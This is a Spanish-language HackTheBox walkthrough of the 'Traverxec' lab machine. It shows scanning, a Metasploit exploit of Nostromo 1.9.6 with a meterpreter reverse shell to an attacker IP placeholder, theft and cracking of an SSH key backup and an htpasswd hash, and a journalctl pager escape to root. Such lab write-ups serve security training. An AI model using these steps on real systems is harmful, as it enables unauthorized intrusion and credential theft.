---
title: Traverxec
published: 2025-06-10
image: "./logo.png"
tags: [Easy, Nostromo, Exploiting Journalctl, eWPT, OSCP]
category: HackTheBox
---

## Información Básica

### Técnicas vistas

- Nostromo Exploitation
- Abusing Nostromo HomeDirs Configuration
- Exploiting Journalctl (Privilege Escalation)

### Preparación

- eWPT
- OSCP (Escalada)

***

## Reconocimiento

Para comenzar el reconocimiento de esta máquina usaremos el comando **scan**:

```sh
scan () {
	sudo nmap -sS --min-rate=5000 -p- --open -vvv -n -Pn "$1" -oG "nmap/AllPorts"
}
```

Esto nos exportará los puertos que estén abiertos para que posteriormente ver las versiones que corren en cada puerto.

```
# Nmap 7.95 scan initiated Tue Jun 10 13:15:31 2025 as: /usr/lib/nmap/nmap -sS --min-rate=5000 -p- --open -vvv -n -Pn -oG nmap/AllPorts 10.10.10.165
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.165 ()   Status: Up
Host: 10.10.10.165 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///    Ignored State: filtered (65533)
# Nmap done at Tue Jun 10 13:15:57 2025 -- 1 IP address (1 host up) scanned in 26.48 seconds
```

Una vez escaneados los puertos **80** y 22 veremos lo siguiente:

```
# Nmap 7.95 scan initiated Tue Jun 10 13:19:58 2025 as: /usr/lib/nmap/nmap --privileged -p22,80 -sVC -v -oN nmap/Targeted 10.10.10.165
Nmap scan report for 10.10.10.165
Host is up (0.10s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jun 10 13:20:10 2025 -- 1 IP address (1 host up) scanned in 12.40 seconds
```

Veremos que servidor web está corriendo con **whatweb**:

```sh
❯ whatweb 10.10.10.165
http://10.10.10.165 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[nostromo 1.9.6], IP[10.10.10.165], JQuery, Script, Title[TRAVERXEC]
```

Está usando **Nostromo**, haremos una búsqueda rápida de exploits:

```sh
❯ searchsploit nostromo
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                                        |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Nostromo - Directory Traversal Remote Command Execution (Metasploit)                                                                                                                                                  | multiple/remote/47573.rb
nostromo 1.9.6 - Remote Code Execution                                                                                                                                                                                | multiple/remote/47837.py
nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution                                                                                                                                                  | linux/remote/35466.sh
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

## Explotación

Usaremos **Metasploit** para explotar la vulnerabilidad con la siguiente secuencia de comandos una vez abierto **msfconsole**:

<pre><code>search nostromo
<strong>use exploit/multi/http/nostromo_code_exec
</strong>set rhosts 10.10.10.165
set target 1
set payload linux/x86/meterpreter/reverse_tcp
set lhost &#x3C;IP_ATACANTE>
exploit
</code></pre>

De esta manera obtendremos una reverse shell. Lo primero que haremos será usar [LinEnum](https://github.com/rebootuser/LinEnum) para recavar más información dentro de la máquina. Ejecutaremos el script y al ver los resultados vemos algo interesante:

```
[-] htpasswd found - could contain passwords:
/var/nostromo/conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

Parece que hay una contraseña junto al nombre de david que es un usuario, tendremos este hash en cuenta por si necesitamos crackearlo en un futuro. Ahora vamos a echar un vistazo en ese directorio donde se encuentra nostromo.

```
www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf
# MAIN [MANDATORY]

servername		traverxec.htb
serverlisten		*
serveradmin		david@traverxec.htb
serverroot		/var/nostromo
servermimes		conf/mimes
docroot			/var/nostromo/htdocs
docindex		index.html

# LOGS [OPTIONAL]

logpid			logs/nhttpd.pid

# SETUID [RECOMMENDED]

user			www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess		.htaccess
htpasswd		/var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons			/var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs		/home
homedirs_public		public_www
```

Si buscamos un poco en la [documentación](https://www.nazgul.ch/dev/nostromo_man.html) sobre los HOMEDIRS:

```
HOMEDIRS
     To serve the home directories of your users via HTTP, enable the homedirs
     option by defining the path in where the home directories are stored,
     normally /home.  To access a users home directory enter a ~ in the URL
     followed by the home directory name like in this example:

           http://www.nazgul.ch/~hacki/

     The content of the home directory is handled exactly the same way as a
     directory in your document root.  If some users don't want that their
     home directory can be accessed via HTTP, they shall remove the world
     readable flag on their home directory and a caller will receive a 403
     Forbidden response.  Also, if basic authentication is enabled, a user can
     create an .htaccess file in his home directory and a caller will need to
     authenticate.

     You can restrict the access within the home directories to a single sub
     directory by defining it via the homedirs_public option.
```

Por lo que si buscamos `http://10.10.10.165/~david` igual encontramos algo:

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2Fy7GxVLnAIgxRho2AVzY3%2Fimage.png?alt=media&#x26;token=48882186-e928-4198-9a0b-d7bfff90f0e3" alt=""><figcaption></figcaption></figure>

No parece que podamos hacer nada por aquí. Vamos a ver que hay en el directorio del usuario:

```
www-data@traverxec:/home/david$ ls
ls: cannot open directory '.': Permission denied
```

No tenemos suficientes permisos para leer este directorio, pero por la configuración de antes debería existir `/home/david/public_www`:

```
www-data@traverxec:/home/david/public_www$ ls
index.html  protected-file-area
```

Y dentro de `protected-file-area`:

```
www-data@traverxec:/home/david/public_www/protected-file-area$ ls
backup-ssh-identity-files.tgz
```

Para poder descargarnos esto, lo haremos desde la shell meterpreter con el siguiente comando:

```
download backup-ssh-identity-files.tgz
```

Lo descomprimimos:

```
❯ tar -xvzf backup-ssh-identity-files.tgz
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
```

El fichero **id\_rsa** está cifrado, por lo que lo pasaremos a un formato para que jhon the ripper pueda leerlo:

```
ssh2john id_rsa > ssh_passwd
```

Con el siguiente comando lo crackeamos:

```
❯ john --wordlist=/usr/share/wordlists/rockyou.txt ssh_passwd
Created directory: /home/zelpro/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (id_rsa)     
1g 0:00:00:00 DONE (2025-06-10 15:13) 50.00g/s 12800p/s 12800c/s 12800C/s carolina..freedom
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Teniendo esto, nos conectaremos con:

```
ssh -i id_rsa david@10.10.10.165
```

```
david@traverxec:~$ cat user.txt 
83236acab8051f...
```

Y ya tendríamos la user flag.

## Escalada de privilegios

Ahora somos el usuario **david**, buscando un poco, vemos el directorio `/bin` dentro de la propia carpeta del usuario, el cual contiene el siguiente script:&#x20;

```
david@traverxec:~/bin$ cat server-stats.sh 
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
<strong>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
```

Si ejecutamos el ultimo comando podremos ver los 5 últimos logs del **journalctl**, el cual se ejecuta con permisos root. Si lo ejecutamos normal, no pasa nada:

```
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Tue 2025-06-10 11:20:30 EDT, end at Tue 2025-06-10 16:25:37 EDT. --
Jun 10 11:20:31 traverxec systemd[1]: Starting nostromo nhttpd server...
Jun 10 11:20:31 traverxec systemd[1]: nostromo.service: Can't open PID file /var/nostromo/logs/nhttpd.pid (yet?) after start: No such file or directory
Jun 10 11:20:31 traverxec nhttpd[487]: started
Jun 10 11:20:31 traverxec nhttpd[487]: max. file descriptors = 1040 (cur) / 1040 (max)
Jun 10 11:20:31 traverxec systemd[1]: Started nostromo nhttpd server.
```

Pero si hacemos la terminal lo suficientemente pequeña para no ver todas las lineas, nos saldrá un inpuit. En el si ponemos `!/bin/bash` obtendremos una shell root, en la que podremos ver la flag:

```
root@traverxec:~# cat root.txt 
35deb653549ab2...
```

[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/217)

---